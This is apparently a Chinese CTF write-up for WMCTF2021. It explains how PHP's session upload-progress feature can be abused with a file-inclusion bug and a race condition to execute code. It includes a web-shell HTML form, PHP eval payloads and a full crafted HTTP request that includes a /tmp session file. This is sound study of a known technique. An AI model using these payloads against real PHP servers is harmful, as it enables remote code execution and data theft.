---
layout: post
title: 利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含攻击
date: 2021-08-05 16:36 +0800
last_modified_at: 2021-08-05 16:36:00 +0800
tags: [CTF,Web,Write-up]
toc:  true
---
关键词：PHP_SESSION_UPLOAD_PROGRESS文件包含攻击

在php5.4版本新添加的功能PHP_SESSION_UPLOAD_PROGRESS，在php.ini中表现为：

```
1. session.upload_progress.enabled = on
2. session.upload_progress.cleanup = on
3. session.upload_progress.prefix = "upload_progress_"
4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
5. session.upload_progress.freq = "1%"
6. session.upload_progress.min_freq = "1"
```

`enabled=on`表示`upload_progress`功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；

`cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；

`name`当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；

`prefix+name`将表示为session中的键名

而在文件包含的过程中，当存在文件包含漏洞，即使没有文件上传，我们也可以通过session将恶意语句写入session文件并且对其进行包含（在知道session存放位置的情况下）。

**问题一**

代码里没有`session_start()`,如何创建session文件呢。

**解答一**

其实，如果`session.auto_start=On` ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。

但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。

**问题二**

但是问题来了，默认配置`session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空，

**如何进行rce呢？**

**解答二**

此时我们可以利用竞争，在session文件内容清空前进行包含利用。

实例题目：WMCTF2021 Make_PHP_Great_Again

index给了文件包含

```
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

尝试利用session进行文件上传

首先利用session做一个文件上传的界面

```
<!DOCTYPE html>
<html>
<body>
<form action="http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123<?php eval($_POST['shell']);?>" />
    <input type="file" name="file" />
    <input type="submit" value="submit" />
</form>
</body>
</html>
```

抓包后进行修改：

```
POST /?file=/tmp/sess_heartless HTTP/1.1
Host: 3e771492-4c79-4e06-b736-a86a8ea88e39.node4.buuoj.cn:81
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------27493672372255116902375708634
Content-Length: 2629
Origin: http://localhost
Connection: close
Referer: http://localhost/
Cookie:PHPSESSID=heartless
Upgrade-Insecure-Requests: 1

-----------------------------27493672372255116902375708634
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

§123§<?php eval(system('cat flag.php'));?>
-----------------------------27493672372255116902375708634
Content-Disposition: form-data; name="file"; filename="exp.php"
Content-Type: text/plain
<?php eval($_POST['shell']);?>
-----------------------------27493672372255116902375708634--
```

放到burp里面爆破得出flag

![image-20210805171943779](C:\Gitbook\Import\heart1ess_s_ctf\blogs\assets\wm1.png)